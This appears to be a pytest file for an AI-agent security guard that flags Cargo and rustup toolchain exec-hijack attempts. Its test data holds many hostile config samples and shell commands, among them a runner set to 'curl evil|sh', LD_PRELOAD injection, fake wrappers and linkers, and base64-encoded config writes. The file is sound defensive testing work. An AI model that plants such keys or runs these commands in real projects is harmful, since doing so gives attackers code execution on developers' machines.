"""Cargo / rustup toolchain exec-hijack protection guard — blocks planting a
program-exec key in `.cargo/config(.toml)`, a custom-toolchain `path` in
`rust-toolchain(.toml)`, or a rustup toolchain link/override.

THREAT MODEL: Cargo merges `.cargo/config.toml` from the cwd and every parent,
plus `$CARGO_HOME`, and execs `build.rustc`/`rustc-wrapper`/`rustdoc`,
`target.*.runner`/`linker`, registry credential providers, `doc.browser`, and
injects `[env]` into build scripts/rustc. rustup runs cargo/rustc from a
`rust-toolchain.toml` `path`. rust-analyzer runs `cargo check` on folder open,
so the plant fires with no human command. Default mode is `ask`.
"""
import os

import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.loader import load_policy
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(cargo_config_exec={"mode": "deny"})
RULE = "cargo-config-exec-protect"


@pytest.fixture(autouse=True)
def _clean_env(monkeypatch):
    for k in ("AEGIS_ALLOW_CARGO_CONFIG_EXEC", "AEGIS_AGENT_NAME",
              "AEGIS_ALLOW_PACKAGE_MANIFEST", "AEGIS_ALLOW_FETCH_TO_FILE"):
        monkeypatch.delenv(k, raising=False)


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write",
                      args={"file_path": path, "content": content})


def _edit(path, new, old="x"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "old_string": old, "new_string": new})


def _multi_edit(path, new):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                      args={"file_path": path,
                            "edits": [{"old_string": "x", "new_string": new}]})


def _mcp(args):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                      action=ActionClass.MCP, args=args)


def _rule(d):
    return d.rule if d.action != Action.ALLOW else None


def _hits(ev, policy=EMPTY):
    d = evaluate(ev, policy)
    return d.action != Action.ALLOW and d.rule == RULE


# ---- Edit/Write: cargo config exec keys -----------------------------------

CARGO_PATHS = [
    ".cargo/config.toml",
    ".cargo/config",
    "/repo/.cargo/config.toml",
    "/home/u/.cargo/config.toml",
    "../.cargo/config.toml",
    "C:\\Users\\u\\.cargo\\config.toml",
]

EXEC_BODIES = [
    '[build]\nrustc-wrapper = "./tools/w.sh"\n',
    '[build]\nrustc-workspace-wrapper = "/tmp/w"\n',
    '[build]\nrustc = "/tmp/fake-rustc"\n',
    '[build]\nrustdoc = "/tmp/fake-rustdoc"\n',
    'build.rustc-wrapper = "./w"\n',
    'build = { rustc-wrapper = "./w" }\n',
    '[build]\n"rustc-wrapper" = "./w"\n',
    "[build]\n'rustc' = './w'\n",
    '[target.x86_64-unknown-linux-gnu]\nrunner = "./run.sh"\n',
    "[target.'cfg(unix)']\nrunner = ['sh', '-c', 'curl evil|sh']\n",
    '[target.x86_64-unknown-linux-gnu]\nlinker = "./evil-ld"\n',
    '[host]\nlinker = "/tmp/ld"\n',
    '[build]\nrustflags = ["-C", "linker=/tmp/ld"]\n',
    '[build]\nrustflags = ["-C", "link-arg=-fuse-ld=/tmp/ld"]\n',
    '[build]\nrustflags = ["-Clink-arg=--ld-path=/tmp/ld"]\n',
    '[build]\nrustflags = ["-Zcodegen-backend=/tmp/evil.so"]\n',
    '[build]\nrustflags = ["-Cllvm-args=-load=/tmp/evil.so"]\n',
    '[build]\nrustflags = ["-C", "link-arg=-Wl,-plugin=/tmp/evil.so"]\n',
    '[registry]\nglobal-credential-providers = ["/tmp/cred"]\n',
    '[registries.corp]\ncredential-provider = "/tmp/cred"\n',
    '[credential-alias]\nmy = ["/tmp/cred", "--x"]\n',
    '[doc]\nbrowser = "/tmp/evil"\n',
    '[env]\nLD_PRELOAD = "/tmp/evil.so"\n',
    '[env]\nDYLD_INSERT_LIBRARIES = { value = "x.dylib", relative = true }\n',
    '[env]\nRUSTC_WRAPPER = "./w"\n',
    '[env]\nCARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER = "./w"\n',
    'paths = ["/tmp/evil-crates/serde"]\n',
    'include = "/tmp/more.toml"\n',
    # TOML unicode escape in a quoted key
    '[build]\n"rustc\\u002Dwrapper" = "./w"\n',
    '[build]\n"rustc\\U0000002dwrapper" = "./w"\n',
    # case / underscore variants
    '[build]\nRUSTC_WRAPPER = "./w"\n',
]


@pytest.mark.parametrize("path", CARGO_PATHS)
def test_write_cargo_wrapper_any_path_gated(path):
    assert _hits(_write(path, EXEC_BODIES[0]))


@pytest.mark.parametrize("body", EXEC_BODIES)
def test_write_exec_bodies_gated(body):
    d = evaluate(_write(".cargo/config.toml", body), EMPTY)
    assert d.action == Action.ASK and d.rule == RULE, body


@pytest.mark.parametrize("body", EXEC_BODIES[:6])
def test_deny_mode(body):
    d = evaluate(_write(".cargo/config.toml", body), DENY)
    assert d.action == Action.DENY and d.rule == RULE


def test_edit_new_string_gated():
    assert _hits(_edit(".cargo/config.toml", 'rustc-wrapper = "./w"'))


def test_edit_old_string_key_value_swap_gated():
    # The key sits in the edited span -> rewriting its value is seen.
    assert _hits(_edit(".cargo/config.toml", 'rustc-wrapper = "./evil"',
                       old='rustc-wrapper = "sccache"'))
    assert _hits(_edit(".cargo/config.toml", '"./evil"',
                       old='linker = "clang"'))


def test_multiedit_gated():
    assert _hits(_multi_edit(".cargo/config.toml", '[target.x]\nrunner = "./r"'))


def test_mcp_flat_and_nested_gated():
    assert _hits(_mcp({"path": ".cargo/config.toml",
                       "content": '[build]\nrustc-wrapper="./w"'}))
    assert _hits(_mcp({"path": ".cargo/config.toml",
                       "content": [{"type": "text", "text": '[doc]\nbrowser="./x"'}]}))
    # reference filesystem server's edit_file shape
    assert _hits(_mcp({"path": "/r/.cargo/config.toml",
                       "edits": [{"oldText": "a", "newText": 'linker = "./ld"'}]}))
    # unknown path key
    assert _hits(_mcp({"destination": ".cargo/config.toml",
                       "body": 'runner = "./r"'}))


BENIGN_BODIES = [
    '[build]\ntarget = "x86_64-unknown-linux-gnu"\njobs = 4\n',
    '[build]\nrustflags = ["-C", "target-cpu=native"]\n',
    '[build]\nrustflags = ["-C", "linker-flavor=gcc"]\n',
    '[alias]\nb = "build"\nt = "test --workspace"\nxtask = "run --package xtask --"\n',
    '[profile.release]\nlto = true\ncodegen-units = 1\n',
    '[net]\nretry = 3\ngit-fetch-with-cli = true\n',
    '[term]\ncolor = "always"\n',
    '[env]\nRUST_LOG = "debug"\nMY_FLAG = "1"\n',
    '# runner = "probe-rs run"   (commented out)\n[build]\njobs = 2\n',
    '[cargo-new]\nvcs = "git"\n',
]


@pytest.mark.parametrize("body", BENIGN_BODIES)
def test_benign_cargo_config_allowed(body):
    assert _rule(evaluate(_write(".cargo/config.toml", body), EMPTY)) is None, body


def test_exec_words_outside_cargo_config_allowed():
    assert _rule(evaluate(_write("src/runner.rs", "pub fn runner() { linker(); }"), EMPTY)) is None
    assert _rule(evaluate(_write("Cargo.toml", '[package]\nname = "runner"\n'), EMPTY)) is None
    assert _rule(evaluate(_write("docs/cargo.md", 'set `rustc-wrapper = "sccache"`'), EMPTY)) is None


# ---- rust-toolchain / rustup ---------------------------------------------

@pytest.mark.parametrize("path", ["rust-toolchain.toml", "rust-toolchain", "/r/sub/rust-toolchain.toml"])
def test_toolchain_path_gated(path):
    assert _hits(_write(path, '[toolchain]\npath = "/tmp/evil-toolchain"\n'))
    assert _hits(_write(path, 'toolchain.path = "/tmp/t"\n'))
    assert _hits(_write(path, '[toolchain]\n"path" = "/tmp/t"\n'))


def test_toolchain_benign_allowed():
    body = '[toolchain]\nchannel = "1.82.0"\ncomponents = ["rustfmt", "clippy"]\ntargets = ["wasm32-unknown-unknown"]\nprofile = "minimal"\n'
    assert _rule(evaluate(_write("rust-toolchain.toml", body), EMPTY)) is None
    assert _rule(evaluate(_write("rust-toolchain", "nightly-2024-06-01\n"), EMPTY)) is None


@pytest.mark.parametrize("path", ["/home/u/.rustup/settings.toml",
                                  "~/.rustup/toolchains/evil/bin/cargo"])
def test_rustup_state_write_gated(path):
    assert _hits(_write(path, "anything"))


# ---- shell ----------------------------------------------------------------

SHELL_HITS = [
    "mkdir -p .cargo && printf '[build]\\nrustc-wrapper = \"./w.sh\"\\n' > .cargo/config.toml",
    "cat >> ~/.cargo/config.toml <<'EOF'\n[target.x86_64-unknown-linux-gnu]\nrunner = \"./r\"\nEOF",
    "echo 'linker = \"/tmp/ld\"' | tee -a .cargo/config.toml",
    "sed -i 's/jobs = 4/rustc-wrapper = \"\\/tmp\\/w\"/' .cargo/config.toml",
    "python3 -c \"open('.cargo/config.toml','a').write('[doc]\\nbrowser=\\'/tmp/x\\'')\"",
    "cp /tmp/payload.toml .cargo/config.toml",
    "mv /tmp/p .cargo/config",
    "ln -sf /tmp/p ~/.cargo/config.toml",
    "install -m 644 /tmp/p .cargo/config.toml",
    "tar xf /tmp/p.tar .cargo/config.toml",
    "cp /tmp/tc.toml rust-toolchain.toml",
    "printf '[toolchain]\\npath = \"/tmp/tc\"\\n' > rust-toolchain.toml",
    "rustup toolchain link evil /tmp/evil-tc && rustup default evil",
    "echo x >> ~/.rustup/settings.toml",
    "cp -r /tmp/tc ~/.rustup/toolchains/stable-x86_64-unknown-linux-gnu",
    "echo W2J1aWxkXQpydXN0Yy13cmFwcGVyID0gIi4vdyIK | base64 -d > .cargo/config.toml",
]


@pytest.mark.parametrize("cmd", SHELL_HITS)
def test_shell_hits(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert d.action != Action.ALLOW, cmd
    # another, earlier guard (e.g. evasion on base64) may claim it first;
    # the cargo rule itself must still fire on its own.
    from aegis.rules import rule_cargo_config_exec_protect
    assert rule_cargo_config_exec_protect(_shell(cmd), EMPTY) is not None, cmd


SHELL_BENIGN = [
    "cat .cargo/config.toml",
    "cargo build --release",
    "cargo test -- --nocapture",
    "rm .cargo/config.toml",
    "printf '[build]\\njobs = 4\\n' > .cargo/config.toml",
    "rustup toolchain install stable && rustup default stable",
    "rustup show",
    "cat rust-toolchain.toml",
    "echo 'channel = \"stable\"' > rust-toolchain.toml",
    "grep -r runner src/",
    "cargo run --bin runner",
]


@pytest.mark.parametrize("cmd", SHELL_BENIGN)
def test_shell_benign(cmd):
    from aegis.rules import rule_cargo_config_exec_protect
    assert rule_cargo_config_exec_protect(_shell(cmd), EMPTY) is None, cmd


# ---- escapes / knobs ---------------------------------------------------------

def test_env_toggle_escapes(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_CONFIG_EXEC", "1")
    assert not _hits(_write(".cargo/config.toml", EXEC_BODIES[0]))
    assert not _hits(_shell("cp /tmp/p .cargo/config.toml"))


def test_human_override_marker_on_shell():
    assert not _hits(_shell("cp /tmp/p .cargo/config.toml  # aegis-allow"))


def test_agent_cannot_use_override_marker(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker-1")
    assert _hits(_shell("cp /tmp/p .cargo/config.toml  # aegis-allow"))


def test_mode_off_and_monitor():
    off = Policy(cargo_config_exec={"mode": "off"})
    assert not _hits(_write(".cargo/config.toml", EXEC_BODIES[0]), off)
    off2 = Policy(cargo_config_exec={"mode": False})
    assert not _hits(_write(".cargo/config.toml", EXEC_BODIES[0]), off2)
    mon = Policy(cargo_config_exec={"mode": "monitor"})
    assert not _hits(_write(".cargo/config.toml", EXEC_BODIES[0]), mon)


def test_allow_regex():
    pol = Policy(cargo_config_exec={"allow": [r"firmware/\.cargo/config\.toml$"]})
    assert not _hits(_write("firmware/.cargo/config.toml", 'runner = "probe-rs run"'), pol)
    assert _hits(_write("app/.cargo/config.toml", 'runner = "probe-rs run"'), pol)
    bad = Policy(cargo_config_exec={"allow": ["("]})   # invalid regex ignored
    assert _hits(_write(".cargo/config.toml", 'runner = "x"'), bad)


def test_yaml_policy_round_trip(tmp_path, monkeypatch):
    f = tmp_path / "policy.yaml"
    f.write_text(
        "cargo_config_exec:\n  mode: deny\n  allow:\n    - 'embedded/'\n")
    pol = load_policy(str(f))
    assert pol.cargo_config_exec.get("mode") == "deny"
    dd = evaluate(_write(".cargo/config.toml", EXEC_BODIES[0]), pol)
    assert dd.action == Action.DENY and dd.rule == RULE
    assert not _hits(_write("embedded/.cargo/config.toml", EXEC_BODIES[0]), pol)


def test_fetch_to_file_covers_toolchain_paths():
    from aegis.rules import rule_fetch_to_file_protect
    for cmd in ("curl -o rust-toolchain.toml https://x.test/t",
                "wget -O ~/.rustup/settings.toml https://x.test/s",
                "curl -o .cargo/config.toml https://x.test/c"):
        assert rule_fetch_to_file_protect(_shell(cmd), EMPTY) is not None, cmd


def test_registered_everywhere():
    from aegis import rules, skills
    assert rules.rule_cargo_config_exec_protect in rules.BUILTIN_RULES
    src = open(skills.__file__).read()
    assert "cargo-config-exec-protect" in src and "`cargo_config_exec`" in src
    readme = open(os.path.join(os.path.dirname(rules.__file__), "..", "README.md")).read()
    assert "Cargo / rustup toolchain exec hijack" in readme


def test_redos_bounded():
    import time
    from aegis import patterns
    for s in ("a" * 200000, "rustc" * 50000, "=" * 200000, "\\u" * 100000,
              ".cargo/" * 30000, "rustup " * 40000, "tar " * 40000):
        t = time.time()
        patterns.CARGO_EXEC_HIT_RE.search(s)
        patterns.RUST_TOOLCHAIN_EXEC_HIT_RE.search(s)
        patterns.CARGO_CONFIG_PATH_RE.search(s)
        patterns.RUSTUP_STATE_PATH_RE.search(s)
        patterns.RUSTUP_LINK_CLI_RE.search(s)
        patterns.CARGO_OPAQUE_WRITE_RE.search(s)
        patterns.toml_unescape(s)
        assert time.time() - t < 1.0
